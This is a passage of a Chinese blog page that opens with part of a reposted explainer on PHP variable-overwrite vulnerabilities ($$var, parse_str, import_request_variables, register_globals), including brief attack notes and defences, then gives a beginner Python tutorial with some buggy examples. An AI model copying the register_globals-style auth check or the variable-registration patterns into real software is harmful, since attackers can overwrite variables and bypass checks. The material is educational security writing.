-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$var</span> = <span class="string">&quot;sfc9982&quot;</span>;</span><br><span class="line"><span class="variable">$$var</span> = <span class="string">&quot;UPON&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$var</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$var</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sfc9982</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：sfc9982</span><br><span class="line">UPON</span><br><span class="line">UPON</span><br></pre></td></tr></table></figure> ## parse_str() &gt; parse_str()把查询字符串解析到变量中
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span>,<span class="keyword">array</span>)</span><br><span class="line"><span class="keyword">string</span>  必需。规定要解析的字符串。</span><br><span class="line"><span class="keyword">array</span> 可选。规定存储变量的数组的名称。该参数指示变量将被存储到数组中。</span><br></pre></td></tr></table></figure> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=eeknight&amp;age=20&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">eeknight</span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure> 攻击方式
-如果parse_str()括号是GET，POST等，我们就可以直接执行函数。</li>
-</ul>
-<h2 id="md_parse_str">md_parse_str</h2>
-<blockquote>
-<p>md_parse_str--&gt;解析GET/POST/COOKIE数据并设置全局变量。具体用法和parse_str()一样</p>
-</blockquote>
-<h2 id="import_request_variables">import_request_variables()</h2>
-<blockquote>
-<p>import_request_variables()函数将GET/POST/COOKIE变量导入到全局作用域中。
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入POST提交的变量值，前缀为post_</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variable</span>(<span class="string">&quot;p&quot;</span>,<span class="string">&quot;post_&quot;</span>);</span><br><span class="line"><span class="comment">//导入GET和POST提交的变量值，前缀为gp_,GET优先于POST</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variable</span>(<span class="string">&quot;gp&quot;</span>,<span class="string">&quot;_gp&quot;</span>);</span><br><span class="line"><span class="comment">//导入Cookie和GET的变量值，Cookie变量值优先于GET</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variable</span>(<span class="string">&quot;cg&quot;</span>,<span class="string">&quot;_cg&quot;</span>);</span><br></pre></td></tr></table></figure> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>(<span class="string">&quot;gP&quot;</span>, <span class="string">&quot;ee_&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ee_knight</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> 攻击方式
-只要利用了这个函数，就可以直接对里面的变量进行赋值。</p>
-</blockquote>
-<h2 id="register_globals">register_globals</h2>
-<blockquote>
-<p>register_globals的意思就是注册为全局变量<br />
-当php.ini中register_globals=On时，传递过来的值会被直接注册文全局变量，当为off时，需要到特定的数组中去得到
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;Register_globals:&quot;</span>.(<span class="keyword">int</span>)<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;register_globals&quot;</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<h1 id="一些附加说明">一些附加说明</h1>
-<ol type="1">
-<li>parse_str()<br />
-php.ini文件中的magic_quotes_gpc设置影响该函数的输出。如果已启用，那么在parse_str()解析之前，变量会被addslashes()转换。</li>
-<li>import_request_variables()该函数支持的版本： PHP 4 &gt;= 4.1.0, PHP
-5 &lt; 5.4.0。</li>
-<li>register_globals从php5.3.0 起废弃，并从php5.4.0时移除。</li>
-</ol>
-<h1 id="漏洞防御">漏洞防御</h1>
-<ol type="1">
-<li>addslashes()在每个双引号前添加反斜杠。</li>
-<li>使用原始变量，不进行变量注册；</li>
-<li>如果一定要进行变量注册，可以在注册变量前判断变量是否存在。</li>
-</ol>
-<p>转载于<a
-target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000039720673">细说变量覆盖那些事</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/12/%E6%95%A3%E8%A3%85Python%E9%80%9F%E6%88%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/12/%E6%95%A3%E8%A3%85Python%E9%80%9F%E6%88%90/" class="post-title-link" itemprop="url">散装Python速成</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-12 16:51:05" itemprop="dateCreated datePublished" datetime="2022-11-12T16:51:05+08:00">2022-11-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:35:13" itemprop="dateModified" datetime="2023-04-23T17:35:13+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index"><span itemprop="name">Python</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong><em>本文(侧重于类、文件和异常)配合《Python编程：从入门到实践》食用效果更佳QAQ</em></strong></p>
-<h1 id="变量">变量</h1>
-<h2 id="字符串大小写">字符串大小写：</h2>
-<ul>
-<li>title()</li>
-<li>upper()</li>
-<li>lower()</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;ada lovelace&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name.title())</span><br></pre></td></tr></table></figure>
-<p>合并字符串 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">first_name = <span class="string">&quot;ada&quot;</span></span><br><span class="line">last_name = <span class="string">&quot;lovelace&quot;</span></span><br><span class="line">full_name = first_name + <span class="string">&quot; &quot;</span> + last_name</span><br><span class="line"><span class="built_in">print</span>(full_name)</span><br></pre></td></tr></table></figure></p>
-<h2 id="删除空白">删除空白：</h2>
-<ul>
-<li>rstrip()</li>
-<li>lstrip()</li>
-<li>strip()</li>
-</ul>
-<h2 id="str">str()</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">23</span></span><br><span class="line">message = <span class="string">&quot;Happy &quot;</span> + <span class="built_in">str</span>(age) +<span class="string">&quot;rd Birthday!&quot;</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure>
-<h1 id="列表">列表</h1>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycles = [<span class="string">&#x27;trek&#x27;</span>,<span class="string">&#x27;cannondale&#x27;</span>,<span class="string">&#x27;redline&#x27;</span>,<span class="string">&#x27;specialized&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(bicycles[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
-<p><strong>列表的索引从0开始</strong>
-将索引指定为-1可返回最后一个元素</p>
-<h2 id="添加元素">添加元素：</h2>
-<ul>
-<li>append(元素)</li>
-<li>insert(索引，元素) <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">motorcycles = [<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">motorcycles.append(<span class="string">&#x27;ducati&#x27;</span>)</span><br><span class="line">motorcycles.insert(<span class="number">0</span>,<span class="string">&#x27;liudazhuang&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="删除元素">删除元素：</h2>
-<ul>
-<li>del 列表名[索引]</li>
-<li>pop(索引)</li>
-<li>remove(值) <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">motorcycles = [<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> motorcycles[<span class="number">0</span>]</span><br><span class="line">popped_motorcycle = motorcycles.pop(<span class="number">2</span>)</span><br><span class="line">motorcycles.remove(<span class="string">&#x27;yamaha&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="列表排序">列表排序；</h2>
-<ul>
-<li>sort()<br />
-<code>reverse=True(逆序)、永久排序</code></li>
-<li>sorted(列表名)<br />
-<code>临时排序</code></li>
-<li>reverse()<br />
-<code>反转顺序</code> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">cars.sort()</span><br><span class="line">cars.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(cars))</span><br><span class="line">cars.reverse()-</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="列表长度">列表长度：</h2>
-<ul>
-<li>len()</li>
-</ul>
-<h2 id="遍历列表">遍历列表：</h2>
-<p>for循环： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">magicians=[<span class="string">&#x27;alice&#x27;</span>,<span class="string">&#x27;david&#x27;</span>,<span class="string">&#x27;carolina&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> magician <span class="keyword">in</span> magicians:</span><br><span class="line">    <span class="built_in">print</span>(magincian)</span><br></pre></td></tr></table></figure></p>
-<p>数字列表： range()函数: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure></p>
-<p><strong>只会输出1~4！！！(左闭右开)</strong></p>
-<p>使用range()创建数字列表： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">numbers=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br></pre></td></tr></table></figure>
-<strong>range的第三个参数表示步长</strong></p>
-<p>数字列表简单统计 * max() * min() * sum()</p>
-<p>列表解析： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">squares = [value**<span class="number">2</span> <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(squares)  </span><br></pre></td></tr></table></figure> 切片(列表的一部分)： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eli&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">0</span>:<span class="number">3</span>])</span><br></pre></td></tr></table></figure>
-输出索引为0、1、2的前三个元素<br />
-如果没有指定第一个索引，自动从列表开头开始 没有终止索引到列表末尾
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">players[-<span class="number">3</span>:]</span><br></pre></td></tr></table></figure> 输出最后三个元素</p>
-<p>复制列表： 同时省略起始索引和终止索引<code>[:]</code><br />
-<strong><code>列表1=列表2</code>这种写法实际上指向同一个列表</strong></p>
-<p>元组(不可变的列表)： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dimensions=(<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></p>
-<h1 id="if语句">if语句</h1>
-<ul>
-<li>and</li>
-<li>or</li>
-<li>in <code>检查特定值是否包含在列表中</code></li>
-<li>not in</li>
-<li>True/False <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> conditional_test:</span><br><span class="line">    do something</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h1 id="字典">字典</h1>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(alien_0[<span class="string">&#x27;color&#x27;</span>])</span><br><span class="line">alien_0[<span class="string">&#x27;x_position&#x27;</span>] = <span class="number">0</span></span><br><span class="line">alien_0[<span class="string">&#x27;y_position&#x27;</span>] = <span class="number">25</span></span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br><span class="line"><span class="keyword">del</span> alien_0[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br></pre></td></tr></table></figure>
-<p>遍历字典： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user_0 = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;efermi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;enrico&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;fermi&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> user_0.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nKey: &quot;</span>+key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Value: &quot;</span>+value)</span><br></pre></td></tr></table></figure> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> favorite_languages.keys():</span><br><span class="line">    <span class="built_in">print</span>(name.title())</span><br></pre></td></tr></table></figure>
-遍历字典时，会默认遍历所有的键。如果将<code>for name in favorite_language.keys():</code>替换为<code>for name in favorite_languages:</code>输出不变。<br />
-<strong>实际上，方法keys()返回一个列表，其中包含字典中的所有键。</strong>
-方法values()返回一个值列表，为剔除重复项，可使用集合(set)集合类似于列表，但每个元素都必须是独一无二的。</p>
-<h1 id="用户输入和while循环">用户输入和while循环</h1>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;Tell me something,and I will repeat it back to you: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure>
-<p>通过int()来获取数值输入</p>
-<p>删除包含特定值的所有列表元素 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pets = [<span class="string">&#x27;dog&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;dog&#x27;</span>,<span class="string">&#x27;goldfish&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;rabit&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="string">&#x27;cat&#x27;</span> <span class="keyword">in</span> pets:</span><br><span class="line">    pets.remove(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pets)</span><br></pre></td></tr></table></figure> 使用用户输入填充字典
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">response = &#123;&#125;</span><br><span class="line"><span class="comment"># 设置一个标志</span></span><br><span class="line">polling_active = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> polling_active:</span><br><span class="line">    name = <span class="built_in">input</span>(<span class="string">&quot;\nWhat is you name? &quot;</span>)</span><br><span class="line">    response = <span class="built_in">input</span>(<span class="string">&quot;Which mountain would you like to climb someday? &quot;</span>)</span><br><span class="line">    <span class="comment"># 将答案存储在字典中</span></span><br><span class="line">    responses[name] = response</span><br><span class="line">    <span class="comment"># 看看是否还有人要参与调查</span></span><br><span class="line">    repeat = <span class="built_in">input</span>(<span class="string">&quot;Would you like to led another person respond? (yes/ no) &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> repeat == <span class="string">&#x27;no&#x27;</span>:</span><br><span class="line">        polling_active = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 调查结束，显示结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n---Poll Results ---&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name,response <span class="keyword">in</span> responses.items():</span><br><span class="line">    <span class="built_in">print</span>(name+<span class="string">&quot; would like to climb &quot;</span>+response+<span class="string">&quot;.&quot;</span>)</span><br></pre></td></tr></table></figure></p>
-<h1 id="函数">函数</h1>
-<p>定义函数 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet_user</span>(<span class="params">username</span>)):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;显示简单的问候语&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span>+username.title()+<span class="string">&quot;!&quot;</span>)</span><br><span class="line">greet_user(<span class="string">&#x27;jesse&#x27;</span>)</span><br></pre></td></tr></table></figure>
-""""""中的文本被称为<strong>文档字符串</strong>的注释，python用它们来生成有关程序中函数的文档。
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">animal_type,pet_name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span>+animal_type+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;My &quot;</span>+animal_type+<span class="string">&quot;&#x27;s name is &quot;</span>+pet_name.title()+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">describe_pet(<span class="string">&#x27;hamster&#x27;</span>,<span class="string">&#x27;harry&#x27;</span>)<span class="comment"># 位置实参</span></span><br><span class="line">describe_pet(animal_type=<span class="string">&#x27;hamster&#x27;</span>,pet_name=<span class="string">&#x27;harry&#x27;</span>)<span class="comment"># 关键字实参</span></span><br></pre></td></tr></table></figure> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">pet_name,animal_type=<span class="string">&#x27;dog&#x27;</span></span>):<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span>+animal_type+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;My &quot;</span>+animal_type+<span class="string">&quot;&#x27;s name is &quot;</span>+pet_name.title()+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    describe_pet(pet_name=<span class="string">&#x27;willie&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<strong>在使用默认值的时候，在形参列表中必须先列出没有默认值的参数，在列出有默认值的形参。</strong></p>
-<p>传递任意数量的实参： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_pizza</span>(<span class="params">*toppings</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;打印顾客点的所有配料&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(toppings)</span><br><span class="line">make_pizza(<span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">make_pizza(<span class="string">&#x27;mashrooms&#x27;</span>,<span class="string">&#x27;green peppers&#x27;</span>,<span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure>
-形参名*toppings中的星号让python创建一个名为toppings的空元组，并将收到的所有值都封装到这个元组中。<br />
-如果要让函数接受不同类型的实参，必须在函数定义中将接纳任意数量实参的形参放在最后。
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_profile</span>(<span class="params">first,last,**user_info</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;创建一个字典，其中包含我们知道的有关用户的一切&quot;&quot;&quot;</span></span><br><span class="line">    profile = &#123;&#125;</span><br><span class="line">    profile[<span class="string">&#x27;first_name&#x27;</span>] = first</span><br><span class="line">    profile[<span class="string">&#x27;last_name&#x27;</span>] = last</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> user_info.items():</span><br><span class="line">        profile[key] = value</span><br><span class="line">    <span class="keyword">return</span> profile</span><br><span class="line">user_profile = build_profile(<span class="string">&#x27;albert&#x27;</span>,<span class="string">&#x27;einstein&#x27;</span>,</span><br><span class="line">                              location = <span class="string">&#x27;princeton&#x27;</span>,</span><br><span class="line">                              field = <span class="string">&#x27;physics&#x27;</span>  </span><br><span class="line">                                )</span><br><span class="line"><span class="built_in">print</span>(user_profile)</span><br></pre></td></tr></table></figure> 形参**user_info中的两个星号让python
-创建一个名为user_info的空字典，并将收到的所有名称——值对都封装到这个字典中</p>
-<h2 id="将函数存储在模块中">将函数存储在模块中</h2>
-<ul>
-<li>导入整个模块 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pizza</span><br><span class="line">pizza.make_pizza(<span class="number">16</span>,<span class="string">&#x27;pepperoni&#x27;</span>)</span><br></pre></td></tr></table></figure>
-要调用被导入的模块中的函数，可指定导入的模块的名称pizza和函数名make_pizza(),并用句点分隔它们
-<code>module_name.function_name()</code></li>
-<li>导入特定的函数 <code>from module_name import function_name</code>
-通过用逗号分隔函数名，可根据需要从模块中导入任意数量的函数
-<code>from module_name import function_0,function_1,function_2</code>
-若使用这种语法，调用函数时就无需使用句点。</li>
-<li>使用as给函数指定别名
-<code>from module_name import function_name as fn</code></li>
-<li>使用as给模块指定别名 <code>import module_name as mn</code></li>
-<li>导入模块中的所有函数 <code>from module_name import *</code>
-可直接通过名称调用</li>
-</ul>
-<h1 id="类">类</h1>
-<h2 id="创建类">创建类</h2>
